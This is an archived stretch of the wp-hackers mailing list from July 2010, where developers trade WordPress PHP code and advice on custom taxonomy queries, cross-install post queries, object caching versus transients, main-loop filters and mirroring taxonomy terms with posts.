>>>> a specific custom category (taxonomy) and I have no idea how to get
>> it
>>>> done. All I want is a page that outputs all the posts for a certain
>>>> category (and that category only) that I created using this code:
>>>> 
>>>> register_taxonomy("clients", array("portfolio_item"),
>>>> array("hierarchical" => true, "label" => "Clients", "singular_label"
>> =>
>>>> "Client", "rewrite" => array('slug'=>'portfolio_item')));
>>>> 
>>>> Yes, that part was simple, but for some reason my custom taxonomy is
>>>> completely separate from the rest of the site and irretrievable.
>> Can't
>>>> figure out for the life of me how to do this.
>>> 
>>> To start, I think you have your taxonomy registration wrong. (FWIW my
>>> preference would be to go with a singular for the taxonomy name, e.g.
>>> "client" but I'll leave yours as is):
>>> 
>>> $labels = array(
>>>  'name' => _x( 'Clients', 'taxonomy general name' ),
>>>  'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>>>  'search_items' =>  __( 'Search Clients' ),
>>>  'all_items' => __( 'All Clients' ),
>>>  'parent_item' => __( 'Parent Client' ),
>>>  'parent_item_colon' => __( 'Parent Client:' ),
>>>  'edit_item' => __( 'Edit Client' ),
>>>  'update_item' => __( 'Update Client' ),
>>>  'add_new_item' => __( 'Add New Client' ),
>>>  'new_item_name' => __( 'New Client Name' ),
>>> );
>>> 
>>> register_taxonomy("clients", array("portfolio_item"),array(
>>>      "hierarchical" => true,
>>>      "labels" => $labels,
>>>      "public" => true,
>>>      "show_ui" => true,
>>>      "query_var" => "clients",
>>>      "rewrite" => array('slug'=>'client'),
>>> ));
>>> 
>>> Many of these options will default but I went ahead and listed them
>> all.
>>> Read more here:
>>> 
>>> http://codex.wordpress.org/Function_Reference/register_taxonomy
>>> 
>>> As for the rest of your question, I'm unclear.  Do you want all
>> Portfolio
>>> Items that have *any* clients, or a specific client?  For a specific
>> client
>>> i.e. "john-smith" I think this would be what you need (though I
>> haven't run
>>> the code so it may have typos):
>>> 
>>> <?php
>>> $portfolio_items = new
>>> 
>> WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
>> s_per_page=-1');
>>> if ( $portfolio_items->have_posts() ):
>>>      while ( $portfolio_items->have_posts() ) :
>>> $portfolio_items->the_post(); ?>
>>>              <h2 id="post-<?php the_ID(); ?>" <?php post_class();
>>> ?>><?php the_title(); ?></h2>
>>>              <?php the_content();
>>>      endwhile;
>>> endif;
>>> 
>>> If you want to get all portfolio items that have *any* clients I've
>>> actually not done that before so I'll have to let someone else answer.
>>> 
>>> HTH.
>>> 
>>> -Mike
>>> 
>>> ------------------------------
>>> 
>>> Message: 2
>>> Date: Mon, 26 Jul 2010 17:08:30 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Hi,
>>> 
>>> Is there any way that I can query posts from another WordPress install
>>> residing in the same database? I know it can be done via SQL queries
>> but is
>>> there any workaround hacking my way along with API?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 3
>>> Date: Mon, 26 Jul 2010 17:12:22 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> I think this can be done with the help of setup_postdata() by
>> populating
>>> the
>>> fields as explained here -
>>> 
>> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>> 
>>> Right? And is this the best approach?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> Hi,
>>>> 
>>>> Is there any way that I can query posts from another WordPress
>> install
>>>> residing in the same database? I know it can be done via SQL queries
>> but
>>> is
>>>> there any workaround hacking my way along with API?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>>> Twitter : http://twitter.com/ashfame
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 4
>>> Date: Mon, 26 Jul 2010 07:56:17 -0400
>>> From: Aaron Jorbin <aaron at jorb.in>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>>      <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Is this using Multisite?  If so, you can use switch_to_blog -
>>> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
>>> counterpart restore_current_blog -
>>> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
>>> around use the api.
>>> 
>>> 
>>> 
>>> http://aaron.jorb.in
>>> twitter: twitter.com/aaronjorbin
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> I think this can be done with the help of setup_postdata() by
>> populating
>>>> the
>>>> fields as explained here -
>>>> 
>> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>>> 
>>>> Right? And is this the best approach?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>>> Twitter
>>>> : http://twitter.com/ashfame
>>>> 
>>>> 
>>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>> 
>>>>> Hi,
>>>>> 
>>>>> Is there any way that I can query posts from another WordPress
>> install
>>>>> residing in the same database? I know it can be done via SQL
>> queries
>>> but
>>>> is
>>>>> there any workaround hacking my way along with API?
>>>>> 
>>>>> Thanks & Regards
>>>>> Ashish Saini aka Ashfame
>>>>> (Deserve Before You Desire)
>>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
>> |
>>>>> Twitter : http://twitter.com/ashfame
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> 
>>> End of wp-hackers Digest, Vol 66, Issue 101
>>> *******************************************
>>> 
>> 
>> 
>> 
>> -- 
>> Thank you,
>> 
>> Jared Williams
>> Web/Graphic Designer
>> Tweeaks.com  |  New2WP.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Mon Jul 26 21:17:40 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 17:17:40 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <8DA7CE0E-3C39-4F15-9788-514DEE054F09@cefm.ca>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
	<AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>
	<C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
	<8DA7CE0E-3C39-4F15-9788-514DEE054F09@cefm.ca>
Message-ID: <4AF59912-6741-430D-8647-AB8DD2C26CCD@newclarity.net>

On Jul 26, 2010, at 5:05 PM, Charles Frees-Melvin wrote:
> 
> Not to flog a dead horse (or stubborn mule, you decide) would it not just make it a lot easier to combine wp_terms and wp_term_taxonomy into wp_terms and add a wp_termmeta and eliminate wp_term_relationships and have 1 function to get everything in one table and another for meta?

Maybe.  I agree that the current taxonomy system is at times counter-intuitive but what we have works well enough for now and what you propose could introduce all sorts of backward compatibility nightmares that I'd rather not live through all for marginal benefit?  I just spent 100+ hours on a project that would need to be rewritten to support that change.  Ugh.

JMTCW.

-Mike


From mikeschinkel at newclarity.net  Mon Jul 26 21:26:10 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 17:26:10 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
In-Reply-To: <C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
References: <mailman.11.1280145602.13432.wp-hackers@lists.automattic.com>
	<AANLkTinuEOPfaH+Rn4TQs4id7GehgrJA0t4OPgvWfae2@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E31A7@tbs-sbs01.TBS.local>
	<C4C7D49E-330F-4985-8A56-18758CA63670@newclarity.net>
Message-ID: <43A82B40-1B28-4787-B2A6-79C090FF3264@newclarity.net>

Oops, I meant to include this link to a standalone file that you can download to your website root to demonstrate this with your own post_type and taxonomy:

http://gist.github.com/491202

-Mike

On Jul 26, 2010, at 4:56 PM, Mike Schinkel wrote:

> Hi Kris:
> 
> I was intrigued to find a solution for "taxonomy=clients" and "term=any" where "any" is a wildcard (WP_Query() supports "any" as a wildcard for post_types but not for terms of a taxonomy.)
> 
> Here's a hook that adds an "any" wildcard for terms for a taxonomy assuming some other plugin didn't muck with the " AND 0 " inserted into the WHERE clause when a taxonomy term doesn't match:
> 
> add_action('posts_where','my_posts_where',10,2);
> 
> function my_posts_where($where,$query) {
> 	if (isset($query->query_vars['taxonomy']) && $query->query_vars['term']=='any') {
> 		global $wpdb;
> 		$tt = $wpdb->term_taxonomy;
> 		$tr = $wpdb->term_relationships;
> 		$where .= $wpdb->prepare(" AND {$wpdb->posts}.ID IN (
> 						SELECT object_id FROM $tr
> 						INNER JOIN $tt ON $tt.term_taxonomy_id = $tr.term_taxonomy_id
> 						WHERE $tt.taxonomy=%s) ",$query->query_vars['taxonomy']);
> 		$where = str_replace(' AND 0 ','',$where);
> 	}
> 	return $where;
> }
> 
> Your query for this would look like this:
> 
> $posts = new WP_Query("post_type=portfolio_item&taxonomy=clients&term=any&posts_per_page=-1");
> 
> Or like this:
> 
> $posts = new WP_Query(array(
> 	'post_type' => 'portfolio_item',
> 	'taxonomy' => 'clients',
> 	'term' => 'any',
> 	'posts_per_page' => -1,
> ));
> 
> It works but unfortunately it's not very robust because of the need to remove the " AND 0 " from the WHERE clause because there are other reasons get_posts() adds " AND 0 ".  If query natively supported "term=any" or at least if there was a hook in /wp-includes/query.php (lines 2049 and 2068) that allowed us to target this specifically it might be better; if any of the core team agree I'll add a ticket to trac.
> 
> Alternate, maybe someone else knows a better way I didn't discover?
> 
> -Mike
> 
> 
> On Jul 26, 2010, at 10:53 AM, Kris Young wrote:
> 
>> I was as nice as I could be in my original mail without getting
>> frustrated - it really helps though that someone else is having the same
>> problem though. I honestly think this whole process was a lot more
>> complicated than it should have been.
>> 
>> Thanks for your solution - I will do my best to take a look at it today,
>> and will let you know when I make some progress. Thanks again, and also
>> to Mike Schinkel for the same.
>> 
>> Kris
>> 
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Jared
>> Williams
>> Sent: 26 July 2010 14:23
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] wp-hackers Digest, Vol 66, Issue 101
>> 
>> I have a wp_nav_menu, and it has two top level pages that have a bunch
>> of
>> terms I've created for two custom taxonomies, which are for the two top
>> level pages. I'm trying to figure out how I can hide the terms from the
>> drop
>> down menu I made that shows the terms, if there are no posts assigned to
>> a
>> term of the taxonomies. Is this possible? It doesn't seem like it is.
>> 
>> 
>> As for Kris Young's question about showing all posts of a taxonomy, this
>> is
>> a problem I ran into as well, and searched for a long time and found it
>> very
>> hard to figure out.
>> 
>> What I managed to do is list all terms for a taxonomy, and all the posts
>> for
>> each term individually. You may be able to hack this to do what you're
>> trying to do since it is the same as what I needed to do I just didn't
>> have
>> time to make it list only the posts for the taxonomy.
>> 
>> 
>> <?php
>> // Create list of taxonomy terms and list the posts under each term
>> $post_type = 'post';
>> $tax = 'your_custom_taxonomy';
>> $tax_terms = get_terms( $tax );
>> if ($tax_terms) {
>>   foreach ($tax_terms  as $tax_term) {
>>   $args = array(
>>       'post_type' => $post_type,
>>       "tax" => $tax_term->slug,
>>       'post_status' => 'publish',
>>       'posts_per_page' => -1,
>>       'caller_get_posts'=> 1
>>   );
>> 
>>       $my_query = null;
>>       $my_query = new WP_Query($args);
>> 
>>       if( $my_query->have_posts() ) : ?>
>> 
>>           <h2 class="breadcrumb">All <?php echo $tax; ?> Posts For
>> <?php
>> echo $tax_term->name; ?></h2>
>>           <ul class="taxlist">
>>           <?php while ( $my_query->have_posts() ) :
>> $my_query->the_post();
>> ?>
>> 
>>               <li id="post-<?php the_ID(); ?>">
>>                   <a href="<?php the_permalink(); ?>" rel="bookmark"
>> title="Permanent Link to <?php the_title_attribute(); ?>"><?php
>> the_title();
>> ?></a>
>>               </li>
>> 
>> 
>>           <?php endwhile; // end of loop ?>
>>           </ul>
>> 
>>           <?php if( function_exists('wp_pagenavi')) { wp_pagenavi(); }
>> else { ?>
>>               <div class="navigation clearfix">
>>                   <div class="alignleft"><?php
>> next_posts_link('&laquo;
>> Previous Entries') ?></div>
>>                   <div class="alignright"><?php
>> previous_posts_link('Next
>> Entries &raquo;') ?></div>
>>               </div>
>>           <?php } ?>
>> 
>>       <?php else : ?>
>> 
>>           <h2 class="title">Oops</h2>
>>           <p>Looks like something is missing...</p>
>> 
>>       <?php endif; // if have_posts()
>>       wp_reset_query();
>> 
>>   } // end foreach #tax_terms
>> }
>> ?>
>> 
>> Hope this helps.
>> 
>> Jared Williams
>> 
>> 
>> On Mon, Jul 26, 2010 at 8:00 AM,
>> <wp-hackers-request at lists.automattic.com>wrote:
>> 
>>> Send wp-hackers mailing list submissions to
>>>      wp-hackers at lists.automattic.com
>>> 
>>> To subscribe or unsubscribe via the World Wide Web, visit
>>>      http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> or, via email, send a message with subject or body 'help' to
>>>      wp-hackers-request at lists.automattic.com
>>> 
>>> You can reach the person managing the list at
>>>      wp-hackers-owner at lists.automattic.com
>>> 
>>> When replying, please edit your Subject line so it is more specific
>>> than "Re: Contents of wp-hackers digest..."
>>> 
>>> 
>>> Today's Topics:
>>> 
>>> 1. Re: Custom post types - a multitude of problems (Mike Schinkel)
>>> 2. Querying posts of another WordPress install (Ashish Saini)
>>> 3. Re: Querying posts of another WordPress install (Ashish Saini)
>>> 4. Re: Querying posts of another WordPress install (Aaron Jorbin)
>>> 
>>> 
>>> ----------------------------------------------------------------------
>>> 
>>> Message: 1
>>> Date: Mon, 26 Jul 2010 06:06:14 -0400
>>> From: Mike Schinkel <mikeschinkel at newclarity.net>
>>> Subject: Re: [wp-hackers] Custom post types - a multitude of problems
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID: <F70451A1-2EFF-4911-BD5C-ACC86CF452E7 at newclarity.net>
>>> Content-Type: text/plain;       charset=us-ascii
>>> 
>>> On Jul 26, 2010, at 5:20 AM, Kris Young wrote:
>>>> I need to output the contents (all posts, all content of those
>> posts) of
>>>> a specific custom category (taxonomy) and I have no idea how to get
>> it
>>>> done. All I want is a page that outputs all the posts for a certain
>>>> category (and that category only) that I created using this code:
>>>> 
>>>> register_taxonomy("clients", array("portfolio_item"),
>>>> array("hierarchical" => true, "label" => "Clients", "singular_label"
>> =>
>>>> "Client", "rewrite" => array('slug'=>'portfolio_item')));
>>>> 
>>>> Yes, that part was simple, but for some reason my custom taxonomy is
>>>> completely separate from the rest of the site and irretrievable.
>> Can't
>>>> figure out for the life of me how to do this.
>>> 
>>> To start, I think you have your taxonomy registration wrong. (FWIW my
>>> preference would be to go with a singular for the taxonomy name, e.g.
>>> "client" but I'll leave yours as is):
>>> 
>>> $labels = array(
>>>  'name' => _x( 'Clients', 'taxonomy general name' ),
>>>  'singular_name' => _x( 'Client', 'taxonomy singular name' ),
>>>  'search_items' =>  __( 'Search Clients' ),
>>>  'all_items' => __( 'All Clients' ),
>>>  'parent_item' => __( 'Parent Client' ),
>>>  'parent_item_colon' => __( 'Parent Client:' ),
>>>  'edit_item' => __( 'Edit Client' ),
>>>  'update_item' => __( 'Update Client' ),
>>>  'add_new_item' => __( 'Add New Client' ),
>>>  'new_item_name' => __( 'New Client Name' ),
>>> );
>>> 
>>> register_taxonomy("clients", array("portfolio_item"),array(
>>>      "hierarchical" => true,
>>>      "labels" => $labels,
>>>      "public" => true,
>>>      "show_ui" => true,
>>>      "query_var" => "clients",
>>>      "rewrite" => array('slug'=>'client'),
>>> ));
>>> 
>>> Many of these options will default but I went ahead and listed them
>> all.
>>> Read more here:
>>> 
>>> http://codex.wordpress.org/Function_Reference/register_taxonomy
>>> 
>>> As for the rest of your question, I'm unclear.  Do you want all
>> Portfolio
>>> Items that have *any* clients, or a specific client?  For a specific
>> client
>>> i.e. "john-smith" I think this would be what you need (though I
>> haven't run
>>> the code so it may have typos):
>>> 
>>> <?php
>>> $portfolio_items = new
>>> 
>> WP_Query('post_type=portfolio_item&taxonomy=clients&term=john-smith&post
>> s_per_page=-1');
>>> if ( $portfolio_items->have_posts() ):
>>>      while ( $portfolio_items->have_posts() ) :
>>> $portfolio_items->the_post(); ?>
>>>              <h2 id="post-<?php the_ID(); ?>" <?php post_class();
>>> ?>><?php the_title(); ?></h2>
>>>              <?php the_content();
>>>      endwhile;
>>> endif;
>>> 
>>> If you want to get all portfolio items that have *any* clients I've
>>> actually not done that before so I'll have to let someone else answer.
>>> 
>>> HTH.
>>> 
>>> -Mike
>>> 
>>> ------------------------------
>>> 
>>> Message: 2
>>> Date: Mon, 26 Jul 2010 17:08:30 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTi=CHq9bUukSa19MgJVSUU1CuQYfzUj6RBvmy3NS at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Hi,
>>> 
>>> Is there any way that I can query posts from another WordPress install
>>> residing in the same database? I know it can be done via SQL queries
>> but is
>>> there any workaround hacking my way along with API?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 3
>>> Date: Mon, 26 Jul 2010 17:12:22 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers <wp-hackers at lists.automattic.com>
>>> Message-ID:
>>>      <AANLkTimmte-eFUkmk2w3KsaZpWkHCKtD=pxU4OnPj0XA at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> I think this can be done with the help of setup_postdata() by
>> populating
>>> the
>>> fields as explained here -
>>> 
>> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>> 
>>> Right? And is this the best approach?
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> Hi,
>>>> 
>>>> Is there any way that I can query posts from another WordPress
>> install
>>>> residing in the same database? I know it can be done via SQL queries
>> but
>>> is
>>>> there any workaround hacking my way along with API?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>>> Twitter : http://twitter.com/ashfame
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> Message: 4
>>> Date: Mon, 26 Jul 2010 07:56:17 -0400
>>> From: Aaron Jorbin <aaron at jorb.in>
>>> Subject: Re: [wp-hackers] Querying posts of another WordPress install
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>>      <AANLkTin6x+4NT6E6bxR=1Xq43D6txPhT0et2xnK_45Nt at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>> 
>>> Is this using Multisite?  If so, you can use switch_to_blog -
>>> http://codex.wordpress.org/WPMU_Functions/switch_to_blog and it's
>>> counterpart restore_current_blog -
>>> http://codex.wordpress.org/WPMU_Functions/restore_current_blog to move
>>> around use the api.
>>> 
>>> 
>>> 
>>> http://aaron.jorb.in
>>> twitter: twitter.com/aaronjorbin
>>> 
>>> 
>>> On Mon, Jul 26, 2010 at 7:42 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> I think this can be done with the help of setup_postdata() by
>> populating
>>>> the
>>>> fields as explained here -
>>>> 
>> http://codex.wordpress.org/Displaying_Posts_Using_a_Custom_Select_Query
>>>> 
>>>> Right? And is this the best approach?
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>>> Twitter
>>>> : http://twitter.com/ashfame
>>>> 
>>>> 
>>>> On Mon, Jul 26, 2010 at 5:08 PM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>> 
>>>>> Hi,
>>>>> 
>>>>> Is there any way that I can query posts from another WordPress
>> install
>>>>> residing in the same database? I know it can be done via SQL
>> queries
>>> but
>>>> is
>>>>> there any workaround hacking my way along with API?
>>>>> 
>>>>> Thanks & Regards
>>>>> Ashish Saini aka Ashfame
>>>>> (Deserve Before You Desire)
>>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com
>> |
>>>>> Twitter : http://twitter.com/ashfame
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> ------------------------------
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> 
>>> End of wp-hackers Digest, Vol 66, Issue 101
>>> *******************************************
>>> 
>> 
>> 
>> 
>> -- 
>> Thank you,
>> 
>> Jared Williams
>> Web/Graphic Designer
>> Tweeaks.com  |  New2WP.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


From andrew at graymerica.com  Mon Jul 26 21:41:57 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Mon, 26 Jul 2010 17:41:57 -0400
Subject: [wp-hackers] wp_cache function tutorials
Message-ID: <9EEE3084-5CD6-4855-8223-71C9C27F06EB@graymerica.com>

> Just wondering if anyone has resources or tutorials for the various wp_cache
> functions or information on those versus using transients etc?

Here are my slides from my talk at Word Camp RDU about caching and Transient API,
  There are some code samples in there
http://tayloegray.com/2010/05/slide-from-word-camp-raleigh/

You can download my code samples from the talk here:  http://dl.dropbox.com/u/896473/cached-sidebar
.php

Andrew



From otto at ottodestruct.com  Mon Jul 26 21:45:30 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 26 Jul 2010 16:45:30 -0500
Subject: [wp-hackers] wp_cache function tutorials?
In-Reply-To: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>
References: <AANLkTikj9xwBh0T_BDyMuZKZ6_4rDZ7_M+goOHT=fNu1@mail.gmail.com>
Message-ID: <AANLkTimSbQL7K0q8WLX__pqzJ5Qv3tPcqefOWvBwTNyu@mail.gmail.com>

On Mon, Jul 26, 2010 at 3:29 PM, Jeff Rose <jeff at jeffrose.ca> wrote:
> Just wondering if anyone has resources or tutorials for the various wp_cache
> functions or information on those versus using transients etc?
>
> For example, if my blog/site was going to allow people to search a song list
> (custom table of 20,000+ items) - should I cache it and how? That's just an
> example for size though.
>
> I've read the codex, but it's a little thin on practical use.

How you cache data depends on what exactly you're doing with that data.

If you're caching in order to reduce the number of queries to the
database (like if you make a particular query a lot and want to store
the data in memory instead after retrieval), then you should use the
Object Cache. The main way to use these is to use the wp_cache_get and
wp_cache_set functions. The data stored here may or may not be
persistent, depending on the particular configuration. Usually, it's
not persistent across page hits, but it can be and so it should be
used for storing data returned from the database that you don't expect
to change often. If you do change the data, you need to update the
cache as well. Object Caching like this is basically a performance
enhancement. The data in question is not guaranteed to be there when
you do a get on it.

If you want your data to expire on a timed basis, you should use the
Transients API. See http://codex.wordpress.org/Transients_API .
Advantage to this is that it is persistent across page hits, however
it stores data in the database by default. If a persistent object
caching plugin is installed (like memcached), then that automatically
gets used instead. So this should be used for any caching of data that
expires, in order to get maximum benefit from these. This data is much
more likely to persist across page hits, and so should be used for
storing data retrieved from some external source with a timeout. Like
the results from reading RSS feeds from other sites, for example.
Transients should not be used for storing data that you retrieved from
the database, since it stores them in the database by default anyway.

-Otto

From mikeschinkel at newclarity.net  Mon Jul 26 21:50:08 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 17:50:08 -0400
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
	<73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
	<AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
Message-ID: <36B0BF15-6A86-4300-AC5C-F31403BAB65F@newclarity.net>

On Jul 26, 2010, at 3:38 PM, John Blackbourn wrote:
> Spot on, Mike. I find myself grepping through WordPress all the time
> to find the hooks and functions that I need and coming to my own
> conclusions about which hooks and filters are most appropriate. An
> archive of best practices aimed at plugin and theme developers (as
> mentioned in another thread) would save people a lot of time (and
> I'd be very willing to contribute to it).

This might be it, but I'm not sure yet if that's the vision or not (cautiously optimistic):

http://wpdevel.wordpress.com/2010/07/22/plugin-developer-handbook-planning/


>> For example, one solution that comes to mind for John is to use a static (or global) "flag" variable initially set to false or unset and then change it to flag that you've made it through the main query's loop.  But are there ever queries that may run before the main loop, and if so it will break this logic.
> 
> Yeah your second point was my main problem; There are potentially
> loops that run both before and after the main loop so it's not just a
> case of assuming the first loop is the main loop as using a flag.

Yeah.  Didn't expect it to be that easy. :)


>> Back to John's question; how to determine if your hook is in the "main" loop; what artifacts does one inspect?
> 
> I've determined that the 'request' filter is the best fit here as it's
> a filter on the main request parameters (ie. the results of parsing
> the query string) and therefore only affects the main loop. The
> 'parse_request' filter is similar but includes additional parameters
> that I didn't need in my scenario.

Excellent.  Now if we can just capture that knowledge somewhere persistent and easy to find (like that plugin dev handbook?)...


-Mike




From mikeschinkel at newclarity.net  Mon Jul 26 23:09:24 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 19:09:24 -0400
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
Message-ID: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>

Hi all:

I have another "Best Practices" question to ask about mirroring taxonomy terms with posts.

Back at the beginning of July I asked if anyone had code to synchronize custom taxonomies with custom post types[1] and didn't get much response so I ended up writing it and it is working pretty well. I will release as a plugin as soon as I have time to package it. It might even make a nice set of APIs to include with WordPress core in a future release.

However I have concerns about how I implemented it and want to get other's opinions.  Basically the three options to link custom post type records with their corresponding taxonomy term records are summarized as:

1. Using Matching Slugs 
(i.e. $wp_posts->post_name==$wp_terms->slug.)

2. Using wp_postmeta Records 
(i.e. $wp_posts->ID=$wp_postmeta->post_id && $wp_terms->term_id=$wp_postmeta->meta_value && $wp_postmeta->meta_key='_mirrored_term_id')

3. Using the $wp_term_taxomony->parent Field 
(i.e. $wp_posts->ID=$wp_term_taxonomy->parent)

